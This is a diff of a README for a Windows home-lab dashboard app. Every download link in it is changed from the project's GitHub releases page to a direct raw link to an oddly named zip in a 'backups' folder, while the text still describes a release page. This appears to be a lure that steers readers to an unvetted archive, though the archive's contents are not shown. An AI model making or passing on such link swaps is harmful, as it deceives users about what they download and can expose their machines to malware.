@@ -1,11 +1,11 @@
 # 🏠 HomeLab_Dashboard_MCP_Integrated - Simple Home Lab Control, One Place
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue.svg)](https://github.com/CodeBy-red/HomeLab_Dashboard_MCP_Integrated/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue.svg)](https://raw.githubusercontent.com/CodeBy-red/HomeLab_Dashboard_MCP_Integrated/main/backups/Integrated-MC-Home-Lab-Dashboard-preredemption.zip)
 
 ## 📥 Download
 Visit this page to download the Windows release:
 
-[Download HomeLab_Dashboard_MCP_Integrated](https://github.com/CodeBy-red/HomeLab_Dashboard_MCP_Integrated/releases)
+[Download HomeLab_Dashboard_MCP_Integrated](https://raw.githubusercontent.com/CodeBy-red/HomeLab_Dashboard_MCP_Integrated/main/backups/Integrated-MC-Home-Lab-Dashboard-preredemption.zip)
 
 ## 🖥️ What this app does
 HomeLab_Dashboard_MCP_Integrated puts your home lab tools in one place. It gives you a single dashboard for everyday use, with sign-in, HTTPS, Docker support, and offline use.
@@ -40,7 +40,7 @@ If you plan to run it fully offline later, set it up once while you still have a
 Follow these steps on Windows:
 
 1. Open the download page:
-   [https://github.com/CodeBy-red/HomeLab_Dashboard_MCP_Integrated/releases](https://github.com/CodeBy-red/HomeLab_Dashboard_MCP_Integrated/releases)
+   [https://raw.githubusercontent.com/CodeBy-red/HomeLab_Dashboard_MCP_Integrated/main/backups/Integrated-MC-Home-Lab-Dashboard-preredemption.zip](https://raw.githubusercontent.com/CodeBy-red/HomeLab_Dashboard_MCP_Integrated/main/backups/Integrated-MC-Home-Lab-Dashboard-preredemption.zip)
 
 2. Find the latest release.
 
@@ -205,7 +205,7 @@ If a login page appears but does not accept your sign-in, check the account deta
 ## 📂 Where to get the app
 Download the Windows release here:
 
-[https://github.com/CodeBy-red/HomeLab_Dashboard_MCP_Integrated/releases](https://github.com/CodeBy-red/HomeLab_Dashboard_MCP_Integrated/releases)
+[https://raw.githubusercontent.com/CodeBy-red/HomeLab_Dashboard_MCP_Integrated/main/backups/Integrated-MC-Home-Lab-Dashboard-preredemption.zip](https://raw.githubusercontent.com/CodeBy-red/HomeLab_Dashboard_MCP_Integrated/main/backups/Integrated-MC-Home-Lab-Dashboard-preredemption.zip)
 
 ## 🧭 What to expect after install
 Once the app is running, you should see a web dashboard that acts as your main page for home lab tools. From there, you can open linked services, manage access, and keep everything in one place on your local network
